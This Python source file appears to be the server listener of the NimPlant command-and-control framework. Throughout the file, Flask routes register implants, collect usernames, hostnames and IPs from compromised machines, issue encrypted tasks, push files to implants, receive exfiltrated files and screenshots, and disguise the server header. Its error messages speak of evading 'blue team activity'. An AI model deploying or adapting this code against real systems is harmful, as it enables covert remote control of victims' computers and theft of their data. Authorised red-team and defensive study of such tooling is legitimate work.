import base64
import gzip
import hashlib
import io
import json
import os
from enum import unique, Enum
from ssl import CERT_NONE, PROTOCOL_TLSv1_2
from typing import Optional
from zlib import decompress, compress

import flask
from gevent.pywsgi import WSGIServer

from server.util.config import config
from server.util.crypto import (
    xor_string,
    decrypt_data,
    encrypt_data,
    decrypt_data_to_bytes,
)
from server.util.func import (
    dump_debug_info_for_exception,
    get_external_ip,
    nimplant_print,
    process_screenshot,
)
from server.util.nimplant import NimPlant, np_server
from server.util.notify import notify_user
from server.util.strings import decode_base64_blob

# Parse configuration from 'config.toml'
try:
    listener_type = config["listener"]["type"]
    listener_ip = config["listener"]["ip"]
    listener_port = config["listener"]["port"]
    register_path = config["listener"]["registerPath"]
    task_path = config["listener"]["taskPath"]
    resultPath = config["listener"]["resultPath"]
    user_agent = config["nimplant"]["userAgent"]
    if listener_type == "HTTPS":
        ssl_cert_path = config["listener"]["sslCertPath"]
        ssl_key_path = config["listener"]["sslKeyPath"]
    B_IDENT = b"789CF3CBCC0DC849CC2B51703652084E2D2A4B2D02003B5C0650"
except KeyError as e:
    nimplant_print(
        f"ERROR: Could not load configuration, check your 'config.toml': {str(e)}"
    )
    os._exit(1)

# Init flask app and surpress Flask/Gevent logging and startup messages
app = flask.Flask(__name__)
ident = decompress(base64.b16decode(B_IDENT)).decode("utf-8")


@unique
class BadRequestReason(Enum):
    BAD_KEY = "bad_key"
    UNKNOWN = "unknown"
    NO_TASK_GUID = "no_task_id"
    ID_NOT_FOUND = "id_not_found"
    NOT_RECEIVING_FILE = "not_receiving_file"
    NOT_HOSTING_FILE = "not_hosting_file"
    INCORRECT_FILE_ID = "incorrect_file_id"
    USER_AGENT_MISMATCH = "user_agent_mismatch"

    def get_explanation(self):
        explanations = {
            self.BAD_KEY: "We were unable to process the request. This is likely caused by a XOR key mismatch between NimPlant and server! It could be an old NimPlant that wasn't properly killed or blue team activity.",
            self.NO_TASK_GUID: "No task GUID was given. This could indicate blue team activity or random internet noise.",
            self.ID_NOT_FOUND: "The specified NimPlant ID was not found. This could indicate an old NimPlant trying to reconnect, blue team activity, or random internet noise.",
            self.NOT_RECEIVING_FILE: "We've received an unexpected file upload request from a NimPlant. This could indicate a mismatch between the server and the Nimplant or blue team activity.",
            self.NOT_HOSTING_FILE: "We've received an unexpected file download request from a NimPlant. This could indicate a mismatch between the server and the Nimplant or blue team activity.",
            self.INCORRECT_FILE_ID: "The specified file id for upload/download is incorrect. This could indicate a mismatch between the server and the Nimplant or blue team activity.",
            self.USER_AGENT_MISMATCH: "User-Agent for the request doesn't match the configuration. This could indicate an old NimPlant trying to reconnect, blue team activity, or random internet noise.",
            self.UNKNOWN: "The reason is unknown.",
        }

        return explanations.get(self, "The reason is unknown.")


# Define a function to notify users of unknown or erroneous requests
def notify_bad_request(
    request: flask.Request,
    reason: BadRequestReason = BadRequestReason.UNKNOWN,
    np_guid: Optional[str] = None,
):
    source = get_external_ip(request)
    headers = dict(request.headers)
    user_agent = request.headers.get("User-Agent", "Unknown")

    nimplant_print(
        f"Rejected {request.method} request from '{source}': {request.path} ({user_agent})",
        target=np_guid,
    )
    nimplant_print(f"Reason: {reason.get_explanation()}", target=np_guid)

    # Printing headers would be useful for checking if we have id or guid definitions.
    nimplant_print("Request Headers:", target=np_guid)
    nimplant_print(json.dumps(headers, ensure_ascii=False), target=np_guid)


# Define Flask listener to run in thread
def flask_listener(xor_key):
    @app.route(register_path, methods=["GET", "POST"])
    # Verify expected user-agent for incoming registrations
    def get_nimplant():
        if user_agent == flask.request.headers.get("User-Agent"):
            # First request from NimPlant (GET, no data) -> Initiate NimPlant and return XORed key
            if flask.request.method == "GET":
                np: NimPlant = NimPlant()
                np_server.add(np)
                xor_bytes = xor_string(np.encryption_key, xor_key)
                encoded_key = base64.b64encode(xor_bytes).decode("utf-8")
                return flask.jsonify(id=np.guid, k=encoded_key), 200

            # Second request from NimPlant (POST, encrypted blob) -> Activate the NimPlant object based on encrypted data
            elif flask.request.method == "POST":
                data = flask.request.json
                np = np_server.get_nimplant_by_guid(
                    flask.request.headers.get("X-Identifier")
                )
                data = data["data"]

                try:
                    data = decrypt_data(data, np.encryption_key)
                    data_json = json.loads(data)
                    ip_internal = data_json["i"]
                    ip_external = get_external_ip(flask.request)
                    username = data_json["u"]
                    hostname = data_json["h"]
                    os_build = data_json["o"]
                    pid = data_json["p"]
                    process_name = data_json["P"]
                    risky_mode = data_json["r"]

                    np.activate(
                        ip_external,
                        ip_internal,
                        username,
                        hostname,
                        os_build,
                        pid,
                        process_name,
                        risky_mode,
                    )

                    notify_user(np)

                    if not np_server.has_active_nimplants():
                        np_server.select_nimplant(np.guid)

                    return flask.jsonify(status="OK"), 200

                except:
                    notify_bad_request(flask.request, BadRequestReason.BAD_KEY)
                    return flask.jsonify(status="Not found"), 404
        else:
            notify_bad_request(flask.request, BadRequestReason.USER_AGENT_MISMATCH)
            return flask.jsonify(status="Not found"), 404

    @app.route(task_path, methods=["GET"])
    # Return the first active task IF the user-agent is as expected
    def get_task():
        np: NimPlant = np_server.get_nimplant_by_guid(
            flask.request.headers.get("X-Identifier")
        )
        if np is not None:
            if user_agent == flask.request.headers.get("User-Agent"):
                # Update the external IP address if it changed
                if not np.ip_external == get_external_ip(flask.request):
                    nimplant_print(
                        f"External IP Address for NimPlant changed from {np.ip_external} to {get_external_ip(flask.request)}",
                        np.guid,
                    )
                    np.ip_external = get_external_ip(flask.request)

                if np.pending_tasks:
                    # There is a task - check in to update 'last seen' and return the task
                    np.checkin()
                    task = encrypt_data(
                        json.dumps(np.get_next_task()), np.encryption_key
                    )
                    return flask.jsonify(t=task), 200
                else:
                    # There is no task - check in to update 'last seen'
                    if np.is_active():
                        np.checkin()
                    return flask.jsonify(status="OK"), 200
            else:
                notify_bad_request(
                    flask.request, BadRequestReason.USER_AGENT_MISMATCH, np.guid
                )
                return flask.jsonify(status="Not found"), 404
        else:
            notify_bad_request(flask.request, BadRequestReason.ID_NOT_FOUND)
            return flask.jsonify(status="Not found"), 404

    @app.route(task_path + "/<file_id>", methods=["GET"])
    # Return a hosted file as gzip-compressed stream for the 'upload' command,
    # IF the user-agent is as expected AND the caller knows the file ID
    def upload_file(file_id):
        np: NimPlant = np_server.get_nimplant_by_guid(
            flask.request.headers.get("X-Identifier")
        )
        if np is not None:
            if user_agent == flask.request.headers.get("User-Agent"):
                if (np.hosting_file is not None) and (
                    file_id == hashlib.md5(np.hosting_file.encode("utf-8")).hexdigest()
                ):
                    task_guid: Optional[str] = None

                    try:
                        # Construct a GZIP stream of the file to upload in-memory
                        # Note: We 'double-compress' here since compression has little use after encryption,
                        #       but we want to present the file as a GZIP stream anyway
                        task_guid = flask.request.headers.get("X-Unique-ID")

                        if task_guid is not None:
                            with open(np.hosting_file, mode="rb") as contents:
                                processed_file = encrypt_data(
                                    compress(contents.read()), np.encryption_key
                                )

                            with io.BytesIO() as data:
                                with gzip.GzipFile(fileobj=data, mode="wb") as zip_data:
                                    zip_data.write(processed_file.encode("utf-8"))
                                result_gzipped = data.getvalue()

                            np.stop_hosting_file()

                            # Return the GZIP stream as a response
                            res = flask.make_response(result_gzipped)
                            res.mimetype = "application/x-gzip"
                            res.headers["Content-Encoding"] = "gzip"
                            return res
                        else:
                            notify_bad_request(
                                flask.request, BadRequestReason.NO_TASK_GUID, np.guid
                            )
                            np.stop_hosting_file()
                            return flask.jsonify(status="Not found"), 404
                    except Exception as e:
                        # Error: Could not host the file
                        nimplant_print(
                            f"An error occurred while uploading file:\n{type(e)}:{e}",
                            np.guid,
                            task_guid=task_guid,
                        )
                        np.stop_hosting_file()
                        return flask.jsonify(status="Not found"), 404
                else:
                    # Error: The Nimplant is not hosting a file or the file ID is incorrect
                    notify_bad_request(
                        flask.request,
                        (
                            BadRequestReason.NOT_HOSTING_FILE
                            if np.hosting_file is None
                            else BadRequestReason.INCORRECT_FILE_ID
                        ),
                        np.guid,
                    )
                    return flask.jsonify(status="OK"), 200
            else:
                # Error: The user-agent is incorrect
                notify_bad_request(
                    flask.request, BadRequestReason.USER_AGENT_MISMATCH, np.guid
                )
                return flask.jsonify(status="Not found"), 404
        else:
            # Error: No Nimplant with the given GUID is currently active
            notify_bad_request(flask.request, BadRequestReason.ID_NOT_FOUND)
            return flask.jsonify(status="Not found"), 404

    @app.route(task_path + "/u", methods=["POST"])
    # Receive a file downloaded from NimPlant through the 'download' command, IF the user-agent is as expected AND the NimPlant object is expecting a file
    def download_file():
        np: NimPlant = np_server.get_nimplant_by_guid(
            flask.request.headers.get("X-Identifier")
        )
        if np is not None:
            if user_agent == flask.request.headers.get("User-Agent"):
                if np.receiving_file is not None:
                    task_guid: Optional[str] = None

                    try:
                        task_guid = flask.request.headers.get("X-Unique-ID")
                        if task_guid is not None:
                            uncompressed_file = gzip.decompress(
                                decrypt_data_to_bytes(
                                    flask.request.data, np.encryption_key
                                )
                            )
                            with open(np.receiving_file, "wb") as f:
                                f.write(uncompressed_file)
                            nimplant_print(
                                f"Successfully downloaded file to '{os.path.abspath(np.receiving_file)}' on NimPlant server.",
                                np.guid,
                                task_guid=task_guid,
                            )

                            np.stop_receiving_file()
                            return flask.jsonify(status="OK"), 200
                        else:
                            notify_bad_request(
                                flask.request, BadRequestReason.NO_TASK_GUID, np.guid
                            )
                            np.stop_receiving_file()
                            return flask.jsonify(status="Not found"), 404
                    except Exception as e:
                        nimplant_print(
                            f"An error occurred while downloading file: {e}",
                            np.guid,
                            task_guid=task_guid,
                        )
                        np.stop_receiving_file()
                        return flask.jsonify(status="Not found"), 404
                else:
                    notify_bad_request(
                        flask.request, BadRequestReason.NOT_RECEIVING_FILE, np.guid
                    )
                    return flask.jsonify(status="OK"), 200
            else:
                notify_bad_request(
                    flask.request, BadRequestReason.USER_AGENT_MISMATCH, np.guid
                )
                return flask.jsonify(status="Not found"), 404
        else:
            notify_bad_request(flask.request, BadRequestReason.ID_NOT_FOUND)
            return flask.jsonify(status="Not found"), 404

    @app.route(resultPath, methods=["POST"])
    # Parse command output IF the user-agent is as expected
    def get_result():
        data = flask.request.json
        np: NimPlant = np_server.get_nimplant_by_guid(
            flask.request.headers.get("X-Identifier")
        )
        if np is not None:
            if user_agent == flask.request.headers.get("User-Agent"):
                res = json.loads(decrypt_data(data["data"], np.encryption_key))
                data = decode_base64_blob(res["result"])

                # Handle Base64-encoded, gzipped PNG file (screenshot)
                if data.startswith("H4sIAAAA"):
                    data = process_screenshot(np, data)

                np.set_task_result(res["guid"], data)
                return flask.jsonify(status="OK"), 200
            else:
                notify_bad_request(
                    flask.request, BadRequestReason.USER_AGENT_MISMATCH, np.guid
                )
                return flask.jsonify(status="Not found"), 404
        else:
            notify_bad_request(flask.request, BadRequestReason.ID_NOT_FOUND)
            return flask.jsonify(status="Not found"), 404

    @app.errorhandler(Exception)
    def all_exception_handler(error):
        nimplant_print(
            f"Rejected {flask.request.method} request from '{get_external_ip(flask.request)}' to {flask.request.path} due to error: {error}"
        )

        dump_debug_info_for_exception(error, flask.request)

        return flask.jsonify(status="Not found"), 404

    @app.after_request
    def change_server(response: flask.Response):
        response.headers["Server"] = ident
        return response

    # Run the Flask web server using Gevent
    if listener_type == "HTTP":
        try:
            http_server = WSGIServer((listener_ip, listener_port), app, log=None)
            http_server.serve_forever()
        except Exception as e:
            nimplant_print(
                f"ERROR: Error setting up web server. Verify listener settings in 'config.toml'. Exception: {e}"
            )
            os._exit(1)
    else:
        try:
            https_server = WSGIServer(
                (listener_ip, listener_port),
                app,
                keyfile=ssl_key_path,
                certfile=ssl_cert_path,
                ssl_version=PROTOCOL_TLSv1_2,
                cert_reqs=CERT_NONE,
                log=None,
            )
            https_server.serve_forever()
        except Exception as e:
            nimplant_print(
                f"ERROR: Error setting up SSL web server. Verify 'sslCertPath', 'sslKeyPath', and listener settings in 'config.toml'. Exception: {e}"
            )
            os._exit(1)
